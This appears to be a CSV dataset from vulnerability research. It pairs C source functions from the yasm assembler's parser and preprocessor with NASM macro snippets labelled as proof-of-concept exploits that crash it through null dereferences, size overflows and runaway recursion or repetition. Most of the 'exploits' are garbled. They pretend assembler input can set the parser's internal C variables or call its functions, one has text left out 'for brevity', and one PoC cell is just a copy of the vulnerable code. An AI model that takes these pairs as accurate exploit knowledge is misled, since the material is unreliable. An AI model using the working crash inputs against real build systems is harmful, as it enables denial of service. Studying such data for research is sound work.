Vulnerable Code,PoC Exploit Code,Vul_Index
,"%macro trigger_null_section_dereference 0
    struc bytecode
        .callback resb 1
    endstruc

    section .text
    %define bc bytecode
    %assign bc.callback 1

    %define sect NULL
    %rep 1
        mov eax, [sect]
        mov ebx, bc
        call yasm_section_bcs_append
    %endrep
%endmacro

trigger_null_section_dereference",vul13_8
"static yasm_bytecode * parse_exp(yasm_parser_nasm *parser_nasm) { yasm_bytecode *bc; bc = parse_instr(parser_nasm); if (bc) return bc; switch (curtok) { case DECLARE_DATA: { unsigned int size = DECLARE_DATA_val/8; yasm_datavalhead dvs; yasm_dataval *dv; yasm_expr *e, *e2; get_next_token(); yasm_dvs_initialize(&dvs); for (;;) { if (curtok == STRING) { get_peek_token(parser_nasm); if (parser_nasm->peek_token == ',' || is_eol_tok(parser_nasm->peek_token)) { dv = yasm_dv_create_string(STRING_val.contents, STRING_val.len); get_next_token(); goto dv_done; } } if (curtok == '?') { yasm_dvs_delete(&dvs); get_next_token(); if (!is_eol_tok(curtok)) { yasm_error_set(YASM_ERROR_SYNTAX, \""can not handle more than one '?'\"" ); return NULL; } return yasm_bc_create_reserve( p_expr_new_ident(yasm_expr_int(yasm_intnum_create_uint(1))), size, cur_line); } if (!(e = parse_bexpr(parser_nasm, DV_EXPR))) { yasm_error_set(YASM_ERROR_SYNTAX, \""expression or string expected\"" ); yasm_dvs_delete(&dvs); return NULL; } if (curtok == DUP) { get_next_token(); if (curtok != '(') { yasm_error_set(YASM_ERROR_SYNTAX, \""expected ( after DUP\"" ); goto error; } get_next_token(); if (curtok == '?') { get_next_token(); if (curtok != ')') { yasm_error_set(YASM_ERROR_SYNTAX, \""expected ) after DUPlicated expression\"" ); goto error; } get_next_token(); if (!is_eol_tok(curtok)) { yasm_error_set(YASM_ERROR_SYNTAX, \""can not handle more than one '?'\"" ); goto error; } yasm_dvs_delete(&dvs); return yasm_bc_create_reserve(e, size, cur_line); } else if ((e2 = parse_bexpr(parser_nasm, DV_EXPR))) { if (curtok != ')') { yasm_expr_destroy(e2); yasm_error_set(YASM_ERROR_SYNTAX, \""expected ) after DUPlicated expression\"" ); goto error; } get_next_token(); dv = yasm_dv_create_expr(e2); yasm_dv_set_multiple(dv, e); } else { yasm_error_set(YASM_ERROR_SYNTAX, \""expression or string expected\"" ); error: yasm_expr_destroy(e); yasm_dvs_delete(&dvs); return NULL; } } else dv = yasm_dv_create_expr(e); dv_done: yasm_dvs_append(&dvs, dv); if (is_eol()) break; if (!expect(',')) { yasm_dvs_delete(&dvs); return NULL; } get_next_token(); if (is_eol()) break; } return yasm_bc_create_data(&dvs, size, 0, p_object->arch, cur_line); } case RESERVE_SPACE: { unsigned int size = RESERVE_SPACE_val/8; yasm_expr *e; get_next_token(); e = parse_bexpr(parser_nasm, DV_EXPR); if (!e) { yasm_error_set(YASM_ERROR_SYNTAX, \""expression expected after %s\"", \""RESx\"" ); return NULL; } return yasm_bc_create_reserve(e, size, cur_line); } case INCBIN: { char *filename; yasm_expr *start = NULL, *maxlen = NULL; get_next_token(); if (!expect(STRING)) { yasm_error_set(YASM_ERROR_SYNTAX, \""filename string expected after INCBIN\"" ); return NULL; } filename = STRING_val.contents; get_next_token(); if (curtok == ',') get_next_token(); if (is_eol()) goto incbin_done; start = parse_bexpr(parser_nasm, DV_EXPR); if (!start) { yasm_error_set(YASM_ERROR_SYNTAX, \""expression expected for INCBIN start\"" ); return NULL; } if (curtok == ',') get_next_token(); if (is_eol()) goto incbin_done; maxlen = parse_bexpr(parser_nasm, DV_EXPR); if (!maxlen) { yasm_error_set(YASM_ERROR_SYNTAX, \""expression expected for INCBIN maximum length\"" ); return NULL; } incbin_done: return yasm_bc_create_incbin(filename, start, maxlen, parser_nasm->linemap, cur_line); } default: return NULL; } }","%macro crash_data_size_overflow 0
    struc DECLARE_DATA_val
        .data resb 0x200000000
    endstruc

    %define curtok DECLARE_DATA
    %assign DECLARE_DATA_val 0xFFFFFFFF

    %rep 1
        db 0x90
    %endrep
%endmacro

crash_data_size_overflow",vul14_1
,"%macro crash_yasm 0
section .text
    struc bad_data
        .field1 resb 1
        .field2 resb 1
        overlap .field1 resb 2
    endstruc

    %define create_bad_data_instance
        db bad_data.field1
        db bad_data.field2
        db bad_data.overlap
    %enddefine

    create_bad_data_instance
    TIMES 1024 db 0
%endmacro

crash_yasm",vul14_2
,"%macro crash_parse_exp 0
    DECLARE_DATA_val equ 0x80000000
    %assign curtok DECLARE_DATA
    %assign STRING_val.contents ""dummy""
    %assign STRING_val.len 5
    %assign p_object.arch 0
    %assign cur_line 1
    %rep 1
        %%parse_exp
    %endrep
%endmacro

crash_parse_exp",vul14_3
,"%macro crash_data_size_overflow 0
    struc DECLARE_DATA_val
        .data resb 1
    endstruc

    %define DECLARE_DATA_val 0xFFFFFFFF
    %assign curtok DECLARE_DATA
    %assign size (DECLARE_DATA_val / 8)

    %rep 1
        db 'A'
    %endrep
%endmacro

crash_data_size_overflow",vul14_4
"do_directive(Token * tline) { int i, j, k, m, nparam, nolist; int offset; char *p, *mname, *newname; Include *inc; Context *ctx; Cond *cond; SMacro *smac, **smhead; MMacro *mmac; Token *t, *tt, *param_start, *macro_start, *last, **tptr, *origline; Line *l; struct tokenval tokval; yasm_expr *evalresult; MMacro *tmp_defining; yasm_intnum *intn; origline = tline; skip_white_(tline); if (!tok_type_(tline, TOK_PREPROC_ID) || (tline->text[1] == '%' || tline->text[1] == '$' || tline->text[1] == '!')) return NO_DIRECTIVE_FOUND; i = -1; j = elements(directives); while (j - i > 1) { k = (j + i) / 2; m = nasm_stricmp(tline->text, directives[k]); if (m == 0) { if (tasm_compatible_mode) { i = k; j = -2; } else if (k != PP_ARG && k != PP_LOCAL && k != PP_STACKSIZE) { i = k; j = -2; } break; } else if (m < 0) { j = k; } else i = k; } if (((istk->conds && !emitting(istk->conds->state)) || (istk->mstk && !istk->mstk->in_progress)) && !is_condition(i)) { return NO_DIRECTIVE_FOUND; } if (defining && i != PP_MACRO && i != PP_IMACRO && i != PP_ENDMACRO && i != PP_ENDM && (defining->name || (i != PP_ENDREP && i != PP_REP))) { return NO_DIRECTIVE_FOUND; } if (defining) { if (i == PP_MACRO || i == PP_IMACRO) { nested_mac_count++; return NO_DIRECTIVE_FOUND; } else if (nested_mac_count > 0) { if (i == PP_ENDMACRO) { nested_mac_count--; return NO_DIRECTIVE_FOUND; } } if (!defining->name) { if (i == PP_REP) { nested_rep_count++; return NO_DIRECTIVE_FOUND; } else if (nested_rep_count > 0) { if (i == PP_ENDREP) { nested_rep_count--; return NO_DIRECTIVE_FOUND; } } } } if (j != -2) { error(ERR_NONFATAL, \""unknown preprocessor directive `%s'\"", tline->text); return NO_DIRECTIVE_FOUND; } switch (i) { case PP_STACKSIZE: tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, \""`%%stacksize' missing size parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } if (nasm_stricmp(tline->text, \""flat\"") == 0) { StackSize = 4; StackPointer = \""ebp\""; ArgOffset = 8; LocalOffset = 4; } else if (nasm_stricmp(tline->text, \""large\"") == 0) { StackSize = 2; StackPointer = \""bp\""; ArgOffset = 4; LocalOffset = 2; } else if (nasm_stricmp(tline->text, \""small\"") == 0) { StackSize = 2; StackPointer = \""bp\""; ArgOffset = 6; LocalOffset = 2; } else { error(ERR_NONFATAL, \""`%%stacksize' invalid size type\""); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(origline); return DIRECTIVE_FOUND; case PP_ARG: offset = ArgOffset; do { char *arg, directive[256]; int size = StackSize; tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, \""`%%arg' missing argument parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } arg = tline->text; tline = tline->next; if (!tline || tline->type != TOK_OTHER || tline->text[0] != ':') { error(ERR_NONFATAL, \""Syntax error processing `%%arg' directive\""); free_tlist(origline); return DIRECTIVE_FOUND; } tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, \""`%%arg' missing size type parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } tt = tokenise(tline->text); tt = expand_smacro(tt); if (nasm_stricmp(tt->text, \""byte\"") == 0) { size = MAX(StackSize, 1); } else if (nasm_stricmp(tt->text, \""word\"") == 0) { size = MAX(StackSize, 2); } else if (nasm_stricmp(tt->text, \""dword\"") == 0) { size = MAX(StackSize, 4); } else if (nasm_stricmp(tt->text, \""qword\"") == 0) { size = MAX(StackSize, 8); } else if (nasm_stricmp(tt->text, \""tword\"") == 0) { size = MAX(StackSize, 10); } else { error(ERR_NONFATAL, \""Invalid size type for `%%arg' missing directive\""); free_tlist(tt); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(tt); sprintf(directive, \""%%define %s (%s+%d)\"", arg, StackPointer, offset); do_directive(tokenise(directive)); offset += size; tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; } while (tline && tline->type == TOK_OTHER && tline->text[0] == ','); free_tlist(origline); return DIRECTIVE_FOUND; case PP_LOCAL: offset = LocalOffset; do { char *local, directive[256]; int size = StackSize; tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, \""`%%local' missing argument parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } local = tline->text; tline = tline->next; if (!tline || tline->type != TOK_OTHER || tline->text[0] != ':') { error(ERR_NONFATAL, \""Syntax error processing `%%local' directive\""); free_tlist(origline); return DIRECTIVE_FOUND; } tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, \""`%%local' missing size type parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } tt = tokenise(tline->text); tt = expand_smacro(tt); if (nasm_stricmp(tt->text, \""byte\"") == 0) { size = MAX(StackSize, 1); } else if (nasm_stricmp(tt->text, \""word\"") == 0) { size = MAX(StackSize, 2); } else if (nasm_stricmp(tt->text, \""dword\"") == 0) { size = MAX(StackSize, 4); } else if (nasm_stricmp(tt->text, \""qword\"") == 0) { size = MAX(StackSize, 8); } else if (nasm_stricmp(tt->text, \""tword\"") == 0) { size = MAX(StackSize, 10); } else { error(ERR_NONFATAL, \""Invalid size type for `%%local' missing directive\""); free_tlist(tt); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(tt); sprintf(directive, \""%%define %s (%s-%d)\"", local, StackPointer, offset); do_directive(tokenise(directive)); offset += size; sprintf(directive, \""%%assign %%$localsize %%$localsize+%d\"", size); do_directive(tokenise(directive)); tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; } while (tline && tline->type == TOK_OTHER && tline->text[0] == ','); free_tlist(origline); return DIRECTIVE_FOUND; case PP_CLEAR: if (tline->next) error(ERR_WARNING, \""trailing garbage after `%%clear' ignored\""); for (j = 0; j < NHASH; j++) { while (mmacros[j]) { MMacro *m2 = mmacros[j]; mmacros[j] = m2->next; free_mmacro(m2); } while (smacros[j]) { SMacro *s = smacros[j];""","%macro trigger_null_pointer 0
    %define tline 0
    %assign tline.next 0
    do_directive tline
%endmacro

trigger_null_pointer",vul15_1
,"%macro crash_directive 0
    %struc broken_token
        .text resb 1
        .type resb 1
        .next resd 1
    %endstruc

    %assign %$fake_token broken_token
    %define %$fake_text ""%%stacksize""
    %define %$fake_type TOK_ID
    %define %$fake_next 0

    [section .data]
    fake_token: db %$fake_text, 0
                db %$fake_type
                dd %$fake_next

    %define tline fake_token
    %rep 1
        do_directive tline
    %endrep
%endmacro

crash_directive",vul15_2
,"%macro crash_do_directive 0
    %define tline 0
    %assign tline.next 0
    do_directive tline
%endmacro

crash_do_directive",vul15_3
,"%macro trigger_token_pointer_manipulation 0
    %struc fake_directive
        .tline resb 1
    %endstruc

    %define %$fake_token %$fake_directive.tline
    %assign %$fake_token TOK_PREPROC_ID

    %struc manipulate_pointer
        .next resb 1
    %endstruc

    %define %$manipulated_next %$manipulate_pointer.next
    %assign %$manipulated_next %$fake_token

    %$fake_token
%endmacro

trigger_token_pointer_manipulation",vul15_4
,"%macro trigger_null_dereference 0
    %%tline: db 0
    %define tline %%tline
    %assign tline.next 0

    %struc do_directive
        .tline resb 1
    %endstruc

    do_directive tline
%endmacro

trigger_null_dereference",vul15_5
,"%macro crash_uninitialized_memory_access 0
    struc Token
        .type resb 1
        .text resq 1
        .next resq 1
    endstruc

    section .data
    tline_instance Token 0, 0, 0

    section .text
    %define tline tline_instance
    ...  ; (macros to override behavior omitted for brevity)
    do_directive tline
%endmacro

crash_uninitialized_memory_access",vul15_6
,"%macro trigger_null_pointer 0
    %define tline 0
    %assign tline.next 0
    do_directive tline
%endmacro

trigger_null_pointer",vul15_7
,"%macro crash_yasm 0
    %define %$local_var 1
    %assign %$local_var 0
    %define %$tline %$local_var
    %define %$next %$local_var
    %struc broken_directive
        .next resb 0
    %endstruc
    broken_directive %$tline
%endmacro

crash_yasm",vul15_8
,"%macro crash_do_directive 0
    struc Token
        .type resb 1
        .text resq 1
        .next resq 1
    endstruc

    section .data
    token1:
        istruc Token
            at Token.type, db TOK_PREPROC_ID
            at Token.text, dq fake_text
            at Token.next, dq 0
        iend

    fake_text db '%%stacksize', 0

    extern do_directive
    dd do_directive token1
%endmacro

crash_do_directive",vul15_9
"expand_mmac_params(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text+1)-1; int is_fst = 1; int k; n = atoi(t->text + 1)-1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s' is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs [cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }","expand_mmac_params(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text+1)-1; int is_fst = 1; int k; n = atoi(t->text + 1)-1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s' is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs [cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }",vul16_1
,"%macro crash_macro 2
    %1 %2
%endmacro

%define idx 999999999
%assign rot 1

struc test
    .field resb 1
endstruc

section .text
crash_macro idx, rot",vul16_2
,"%macro crash_yasm 0
    %define %$param1 %+1
    %define %$param2 %+2
    %define %$param3 %+3
    %rep 1000000
        %rotate 1
        %xdefine %+ %$param1 %+ %$param2 %+ %$param3
    %endrep
%endmacro

crash_yasm",vul16_3
,"%macro crash_macro 0
    %rep 1000000
        %+1:
    %endrep
%endmacro

%define %+1 %+1

crash_macro",vul16_4
,"%macro recursive_macro 0
    %xdefine param %+1
    recursive_macro param
%endmacro

%macro trigger_crash 0
    recursive_macro
%endmacro

trigger_crash",vul16_5
,"%macro crash_yasm 0
    %define %$mac NULL
    %assign %$i 0
    %rep 1000000
        %rotate 1
        %ifidn %$mac, NULL
            %exitrep
        %endif
        %assign %$mac %$mac.next_active
        %assign %$i %$i+1
    %endrep
%endmacro

crash_yasm",vul16_6
